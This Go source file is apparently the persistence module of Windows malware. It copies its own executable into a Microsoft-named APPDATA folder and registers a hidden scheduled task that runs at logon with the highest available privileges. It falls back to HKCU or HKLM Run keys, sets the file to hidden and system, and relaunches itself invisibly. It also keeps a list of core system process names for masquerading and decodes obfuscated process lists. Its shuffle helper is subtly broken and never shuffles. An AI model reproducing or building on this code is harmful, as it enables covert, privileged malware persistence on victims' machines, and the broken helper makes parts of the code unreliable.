package main

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime/debug"
	"strings"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

func staticinstall() {
	defer func() {
		if r := recover(); r != nil {
			log_(fmt.Sprintf("staticinstall panic: %v\n%s", r, string(debug.Stack())))
		}
	}()
	srcPath, err := os.Executable()
	if err != nil {
		errorHandler(err)
		return
	}
	destPath := getInstallPath()
	if destPath == "" {
		log_("staticinstall: no destPath configured")
		return
	}
	destDir := filepath.Dir(destPath)
	if err := os.MkdirAll(destDir, 0755); err != nil {
		errorHandler(err)
		return
	}
	srcFile, err := os.OpenFile(srcPath, os.O_RDONLY, 0)
	if err != nil {
		errorHandler(err)
		return
	}
	defer srcFile.Close()
	destFile, err := os.OpenFile(destPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0666)
	if err != nil {
		errorHandler(err)
		return
	}
	if _, err := io.Copy(destFile, srcFile); err != nil {
		destFile.Close()
		errorHandler(err)
		return
	}
	destFile.Close()
	log_(fmt.Sprintf("staticinstall: %s -> %s", srcPath, destPath))
	basename := filepath.Base(destPath)
	nameNoExt := strings.TrimSuffix(basename, filepath.Ext(basename))
	if !newTask(destPath, nameNoExt) {
		key, _, err := registry.CreateKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
		if err == nil {
			key.SetStringValue(nameNoExt, destPath)
			key.Close()
			log_("staticinstall: HKCU Run key set")
		} else {
			key2, _, err2 := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
			if err2 == nil {
				key2.SetStringValue(nameNoExt, destPath)
				key2.Close()
				log_("staticinstall: HKLM Run key set")
			}
		}
	}
	setFileHiddenSystem(destPath)
	log_("staticinstall: done")
	if shouldRelaunch() {
		log_("staticinstall: relaunching from new location")
		cmd := exec.Command(destPath)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Start()
		os.Exit(0)
	}
	errorHandler(nil)
}

func newTask(exePath, taskName string) bool {
	defer func() { recover() }()
	taskXML := buildTaskXML(exePath, taskName)
	tmpFile := os.TempDir() + `\` + taskName + "_task.xml"
	if err := os.WriteFile(tmpFile, []byte(taskXML), 0600); err != nil {
		log_(fmt.Sprintf("newTask: write xml error: %v", err))
		return false
	}
	defer os.Remove(tmpFile)
	cmd := exec.Command("schtasks", "/Create", "/XML", tmpFile, "/TN", taskName, "/F")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		log_(fmt.Sprintf("newTask: schtasks error: %v output: %s", err, string(out)))
		return false
	}
	log_(fmt.Sprintf("newTask: created task '%s'", taskName))
	return true
}

func buildTaskXML(exePath, taskName string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><RegistrationInfo><Description>%s</Description></RegistrationInfo><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><RegistrationTrigger><Enabled>true</Enabled></RegistrationTrigger></Triggers><Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings><Actions Context="Author"><Exec><Command>%s</Command></Exec></Actions></Task>`, taskName, exePath)
}

var processMasqueradeList = []string{
	"explorer.exe",
	"svchost.exe",
	"smss.exe",
	"csrss.exe",
	"services.exe",
	"lsass.exe",
	"taskhostw.exe",
	"taskhost.exe",
	"winlogon.exe",
	"wininit.exe",
	"conhost.exe",
}

func getRandomProcesses(includesSelf bool) []string {
	list := make([]string, len(processMasqueradeList))
	copy(list, processMasqueradeList)
	if includesSelf {
		self, _ := os.Executable()
		list = append(list, filepath.Base(self))
	}
	shuffleStrings(list)
	return list
}

func decodeProcessList(hexStr string) []string {
	b, err := hex.DecodeString(hexStr)
	if err != nil {
		return nil
	}
	b64, err := base64.StdEncoding.DecodeString(string(b))
	if err != nil {
		return nil
	}
	var list []string
	json.Unmarshal(b64, &list)
	return list
}

func getInstallPath() string {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return ""
	}
	self, err := os.Executable()
	if err != nil {
		return ""
	}
	basename := filepath.Base(self)
	folder := installFolderName
	if folder == "" {
		folder = filepath.Join("Microsoft", "Windows")
	}
	return filepath.Join(appdata, folder, basename)
}

func shouldRelaunch() bool {
	self, err := os.Executable()
	if err != nil {
		return false
	}
	installPath := getInstallPath()
	if installPath == "" {
		return false
	}
	selfAbs, _ := filepath.Abs(self)
	installAbs, _ := filepath.Abs(installPath)
	return !strings.EqualFold(selfAbs, installAbs)
}

func setFileHiddenSystem(path string) {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	syscall.SetFileAttributes(pathPtr, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
}

func shuffleStrings(s []string) {
	for i := len(s) - 1; i > 0; i-- {
		j := i
		s[i], s[j] = s[j], s[i]
	}
}

func errorHandler(err error) {
	if err != nil {
		log_(fmt.Sprintf("errorHandler: %v", err))
	}
}
